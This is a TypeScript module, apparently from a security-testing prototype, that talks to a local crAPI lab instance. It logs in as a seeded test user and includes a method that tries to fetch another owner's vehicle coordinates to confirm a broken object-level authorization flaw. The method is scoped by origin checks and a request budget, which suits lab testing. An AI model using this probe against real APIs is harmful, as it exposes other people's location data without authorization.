import type { PrototypeAction } from "./state.ts";

interface HttpResult {
  status: number;
  path: string;
  body: unknown;
}

interface LoginResponse {
  token?: unknown;
}

interface DashboardResponse {
  name?: unknown;
  email?: unknown;
}

interface LocationResponse {
  fullName?: unknown;
  carId?: unknown;
  vehicleLocation?: { latitude?: unknown; longitude?: unknown };
}

export class LocalCrapiGateway {
  readonly #origin: string;
  readonly #requestBudget: number;
  readonly #dispatch: (action: PrototypeAction) => void;
  #requestsUsed = 0;
  #testToken?: string;

  constructor(target: URL, requestBudget: number, dispatch: (action: PrototypeAction) => void) {
    this.#origin = target.origin;
    this.#requestBudget = requestBudget;
    this.#dispatch = dispatch;
  }

  async healthcheck(): Promise<void> {
    const result = await this.get("/health", false);
    if (result.status !== 200) throw new Error(`crAPI healthcheck returned ${result.status}`);
  }

  async loginTestUser(): Promise<{ authContext: "test-user" }> {
    if (this.#testToken) return { authContext: "test-user" };

    const result = await this.#request("/identity/api/auth/login", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "test@example.com", password: "Test!123" }),
    });
    const body = result.body as LoginResponse;
    if (result.status !== 200 || typeof body.token !== "string") {
      throw new Error(`seed-user login failed with status ${result.status}`);
    }
    this.#testToken = body.token;
    return { authContext: "test-user" };
  }

  async get(path: string, authenticated: boolean): Promise<HttpResult> {
    if (authenticated && !this.#testToken) await this.loginTestUser();
    return this.#request(path, {
      method: "GET",
      headers:
        this.#testToken && authenticated ? { authorization: `Bearer ${this.#testToken}` } : {},
    });
  }

  async reproduceBola(vehicleId: string): Promise<{
    confirmed: boolean;
    evidence: string;
    dashboard: HttpResult;
    location: HttpResult;
  }> {
    await this.loginTestUser();
    const dashboard = await this.get("/identity/api/v2/user/dashboard", true);
    const locationPath = `/identity/api/v2/vehicle/${encodeURIComponent(vehicleId)}/location`;
    const location = await this.get(locationPath, true);
    const dashboardBody = dashboard.body as DashboardResponse;
    const locationBody = location.body as LocationResponse;
    const hasCoordinates =
      typeof locationBody.vehicleLocation?.latitude === "string" &&
      typeof locationBody.vehicleLocation?.longitude === "string";
    const differentOwner =
      typeof dashboardBody.name === "string" &&
      typeof locationBody.fullName === "string" &&
      dashboardBody.name !== locationBody.fullName;
    const confirmed =
      dashboard.status === 200 && location.status === 200 && hasCoordinates && differentOwner;
    const evidence = confirmed
      ? `Authenticated as ${String(dashboardBody.email)} (${String(dashboardBody.name)}) but ${locationPath} returned coordinates for ${String(locationBody.fullName)}.`
      : `Could not prove cross-owner access: dashboard=${dashboard.status}, location=${location.status}, differentOwner=${differentOwner}, coordinates=${hasCoordinates}.`;

    return { confirmed, evidence, dashboard, location };
  }

  async #request(path: string, init: RequestInit): Promise<HttpResult> {
    if (!path.startsWith("/") || path.startsWith("//"))
      throw new Error("Only origin-relative paths are allowed");
    if (this.#requestsUsed >= this.#requestBudget) throw new Error("Request budget exhausted");

    const url = new URL(path, this.#origin);
    if (url.origin !== this.#origin) throw new Error("Out-of-scope origin blocked");

    this.#requestsUsed += 1;
    this.#dispatch({ type: "request" });
    const response = await fetch(url, {
      ...init,
      redirect: "manual",
      signal: AbortSignal.timeout(10_000),
    });
    const text = (await response.text()).slice(0, 12_000);
    let body: unknown = text;
    try {
      body = JSON.parse(text);
    } catch {
      // Text is a valid prototype response body.
    }

    return { status: response.status, path: `${url.pathname}${url.search}`, body };
  }
}
